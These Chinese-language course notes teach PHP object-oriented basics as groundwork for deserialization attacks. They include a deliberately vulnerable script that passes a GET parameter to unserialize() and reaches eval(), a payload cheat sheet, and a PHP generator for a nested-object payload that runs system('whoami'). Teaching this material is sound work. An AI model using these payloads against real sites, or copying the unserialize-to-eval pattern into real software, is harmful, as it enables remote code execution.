---
title: PHP 面向对象与类
category: PHP反序列化/基础
tags: [面向对象, class, 实例化, $this, 访问修饰符, public, protected, private, 对象嵌套]
source: PHP 反序列化课程笔记
order: 2
---

## 一句话概括

**类**是图纸，**对象**是按图纸造出来的具体东西。反序列化干的事，就是拿着一张「数据里的图纸」（字符串中声明的类名）**凭空造对象**，并把它每个属性填成攻击者想要的值 —— 所以必须先把类、属性、方法这三样东西看清楚。

## 原理

### 1. 面向对象到底在讲什么

- **面向过程**：以「整体事件」为中心，把解决问题的步骤写成一个个函数，按顺序调用。
- **面向对象**：以「对象」为中心，把问题拆成一个个参与者，每个参与者自带数据和能力。

同一个「办聚会」的例子，两种写法：

```php
// 面向过程：关注「怎么做」
买饮料();
买零食();
布置场地();
邀请('张三');
邀请('李四');

// 面向对象：关注「谁来做」
$我 = new 聚会组织者();
$我->购买('饮料');
$场地 = new 场地管理器();
$场地->布置();
$我->邀请(new 客人('张三'));
```

面向对象的三大特征：**封装、继承、多态**。

### 2. 封装：把数据藏起来，只留接口

```php
class BankAccount {
    private $balance;      // 私有属性：外部不能直接读
    private $password;     // 私有属性
    private $history = [];

    public function __construct($balance, $password) {
        $this->balance  = $balance;
        $this->password = $password;
    }

    // 公开方法 = 外部唯一能操作账户的入口
    public function withdraw($amount, $inputPassword) {
        if (!$this->verify($inputPassword)) return "密码错误";
        if ($amount > $this->balance)     return "余额不足";
        $this->balance -= $amount;
        return "取款成功，余额 {$this->balance}";
    }

    private function verify($p) { return $this->password === $p; }  // 私有方法：外部调不到
}

$acc = new BankAccount(1000, "123456");
echo $acc->withdraw(200, "123456");   // 可以
// echo $acc->balance;                // 报错：外部不能直接访问私有属性
```

**封装对反序列化的意义**：`private` / `protected` 只能挡住「正常写代码时的调用」，**挡不住序列化**（见 01 篇第 6 节）。所以题目里那些被 `private` 保护起来的「敏感属性」，在 payload 里照样随便改。

### 3. 继承：子类拿到父类的能力

```php
class Animal {
    public $name;
    public function __construct($name) { $this->name = $name; }
    public function eat()  { echo "{$this->name} 在吃东西\n"; }
    public function move() { echo "{$this->name} 在移动\n"; }
}

class Dog extends Animal {                 // 继承 Animal
    public $breed;
    public function __construct($name, $breed) {
        parent::__construct($name);        // 调用父类构造
        $this->breed = $breed;
    }
    public function move() { echo "{$this->name} 正在奔跑\n"; }  // 重写父类方法
    public function bark() { echo "{$this->name} 在汪汪叫\n"; }  // 子类特有方法
}

$dog = new Dog("旺财", "金毛");
$dog->eat();    // 继承来的：旺财在吃东西
$dog->bark();   // 自己的：旺财在汪汪叫
$dog->move();   // 重写过的：旺财正在奔跑
```

**继承对反序列化的意义**：反序列化时，**父类的属性也可能被写进 payload**。审计源码时要顺着头文件里的 `extends` 往上找，别只看当前类。

### 4. 多态：同一个方法名，不同对象有不同行为

上面 `Dog::move()` 与父类 `Animal::move()` 同名但行为不同，调用时按「对象的实际类型」决定跑哪一份 —— 这就是多态。

**多态对反序列化的意义**：`$this->test->action()` 这句代码里，`action()` 到底跑谁的实现，**取决于 `$test` 实际是哪个类的对象** —— 而这个「实际是哪个类」由 payload 决定。这正是 POP 链能成立的语言基础（见 05 篇）。

### 5. 类的定义与成员

```php
class Class_Name {
    // 成员变量（属性）声明
    var $name;
    var $sex;

    // 成员函数（方法）声明
    function jineng($var1) {
        echo $this->name;   // 用 $this 访问当前对象的属性
        echo $var1;         // 直接用参数
    }
}
```

| 术语 | 说明 |
|---|---|
| **成员变量（属性）** | 定义在类内部的变量，描述「是什么」；实例化后成为对象的属性 |
| **成员函数（方法）** | 定义在类内部，描述「能做什么」 |
| **`$this`** | 指向「当前这个对象」，`$this->name` 表示访问本对象的 `name` 属性 |

原笔记里的两个疑问，答案在这里：

- **「为什么不能直接 `echo $name`？」** —— 因为方法内部查找的是**局部变量**，找不到就报「未定义变量」，它**不会**自动去对象属性里找。要访问对象属性必须写 `$this->name`。
- **「`function jineng($var1)` 里为什么是 `$var1`？」** —— `$var1` 只是**形参**，是占位符，名字随便取。真正传进来的值由调用处决定，和属性名没有关系，也不会去「所有属性里查」。

### 6. 访问修饰符

| 修饰符 | 可访问范围 | 序列化后的属性名 |
|---|---|---|
| `public` | 任何地方 | `属性名` |
| `protected` | 本类 + 子类内部 | `\0*\0属性名` |
| `private` | 仅本类内部 | `\0类名\0属性名` |

直接 `echo` 一个对象时**只能看到 `public` 属性**（原笔记「只能回显 public」的结论），要看全貌得用 `var_dump()` / `serialize()`。

### 7. 实例化与赋值

```php
$对象名 = new 类名();
$对象名 = new 类名(参数1, 参数2, ...);
```

```php
class hero {
    var $name = 'benben';
    var $sex;
    function jineng($var1) {
        echo $this->name;
        echo '释放了技能' . $var1;
    }
}

$cyj = new hero();
$cyj->name = 'QIU';          // 用 -> 改属性
$cyj->jineng('踏踏跳');       // 用 -> 调方法
// 输出：QIU释放了技能踏踏跳
```

四条要点：

1. 实例化必须用 `new`；
2. 构造方法名必须是 `__construct`（PHP 4 风格的同名方法已废弃）；
3. 用 `->` 访问属性和方法；
4. `$this` 指向当前对象。

### 8. 把「对象」赋给「属性」——POP 链的积木

这是本节最重要的一条：**属性的值可以不是字符串，而是另一个对象**。

```php
<?php
class fast {
    public $source;
}
class sec {
    var $benben;
}

$a = new sec();
$b = new fast();

$b->source = $a;          // 把 sec 对象赋给 fast 的 source 属性
echo serialize($b);
// O:4:"fast":1:{s:6:"source";O:3:"sec":1:{s:6:"benben";N;}}
?>
```

序列化结果里出现了**两层 `O:`** —— 外层是 `fast`，`source` 的值是一个 `sec` 对象，`sec` 里又有一个 `benben` 属性。

原笔记的疑问「不是说只有一个属性吗，怎么又检测到 sec」，答案是有**两个互不相干的属性计数**：

- 外层 `fast` 确实只有 **1** 个属性（`source`）；
- `fast:1:` 里的 `1` 数的是**属性个数**；
- 而 `source` 这个属性的**值**恰好是另一个对象，于是解析器接着去序列化那个对象 —— 产生内层的 `O:3:"sec":1:`。

**为什么这一点是 POP 链的积木**：反序列化会把这种嵌套结构原样复现 —— 攻击者只要在 payload 里嵌套一个 `evil` 对象，某个属性就会「变成」`evil` 对象。等到代码执行到 `$this->某属性->某方法()` 时，跑的就是 `evil` 的方法。

### 9. 对象嵌套 → 代码执行：一个完整的小例子

```php
<?php
class index {
    private $test;
    public function __construct() {
        $this->test = new normal();     // 摆设：unserialize 不触发 __construct
    }
    public function __destruct() {
        $this->test->action();          // ① 自动触发
    }
}
class normal {
    public function action() { echo "please attack me"; }
}
class evil {
    var $test2;
    public function action() {
        eval($this->test2);             // ② 危险函数
    }
}

unserialize($_GET['test']);
?>
```

正常流程：`index` 的 `$test` 是 `normal` 对象，`action()` 只会打印一句话。

攻击流程：让 `$test` 变成 `evil` 对象、`test2` 装命令：

```text
unserialize() → __destruct() → $test->action() → evil::action() → eval($this->test2)
```

`evil::action()` 是 `eval()` —— 属性一旦可控就等于代码执行。**这条「属性里塞对象 → 魔术方法里调用它 → 落到危险函数」的路径，就是 POP 链的雏形**，第 05 篇会专门讲怎么系统地推出来。

## 利用条件

1. **源码里有类**，且某段代码会用对象属性去调用方法 / 拼进危险函数；
2. **属性可控**：入口的 `unserialize()` 参数受攻击者影响；
3. **属性值可以嵌套对象**：接受任意对象，而不是被强制成字符串（`(string)$x` 会触发 `__toString`，是另一条路）；
4. **知道准确类名与属性名**（含 `private` 的 `\0` 前缀）；写成 URL 参数时注意长度字段。

## Payload 速查

| 目的 | 写法 |
|---|---|
| 属性填字符串 | `s:5:"hello";` |
| 属性填整数 | `i:1;` |
| 属性填对象 | `O:4:"evil":1:{s:5:"test2";s:17:"system('whoami');";}` |
| `private` 属性 | `s:11:"\0index\0test";`（URL 里写 `s:11:"%00index%00test";`） |
| 快速生成 | `echo urlencode(serialize($obj));` |

## 完整示例：生成嵌套对象 payload

```php
<?php
class index {
    private $test;
}
class evil {
    public $test2 = "system('whoami');";
}

$o = new index();          // 用反射或直接改属性都行，这里示意先把 $test 换成 evil
$e = new evil();

// 手工拼：\0index\0test 共 11 字节
$payload = 'O:5:"index":1:{s:11:"' . "\0" . 'index' . "\0" . 'test";'
         . 'O:4:"evil":1:{s:5:"test2";s:17:"system(\'whoami\');";}}';

echo urlencode($payload);
?>
```

把输出丢给 `?test=` 即可。长度字段逐项核对：`index` 5 ✓、`\0index\0test` 11 ✓、`evil` 4 ✓、`test2` 5 ✓、`system('whoami');` 17 ✓。

## 踩坑与备注

- **`__construct()` 在反序列化时不会被触发**。`unserialize()` 不会调用构造函数，所以构造函数里的初始化/赋值（例如 `$this->test = new normal();`）在反序列化路径上是**摆设**，属性值只会用 payload 里写的。
- **`$this` 与局部变量是两回事**：`echo $name` 找的是局部变量；`echo $this->name` 找的是对象属性，两者不会互相回退。
- **`private` 属性的前缀必须带类名**，且 `private` 属性在同名继承场景下可能出现两个不同名字（`\0父类\0x` 与 `\0子类\0x`），做题时按源码里属性**声明在哪个类**来定前缀。
- **审计时顺着 `extends` 往上翻**：父类属性同样可能出现在 payload 里，漏看会算错属性个数。
- **`var $x;` 与 `public $x;` 等价**，老代码常见 `var` 写法，别以为它不是 `public`。
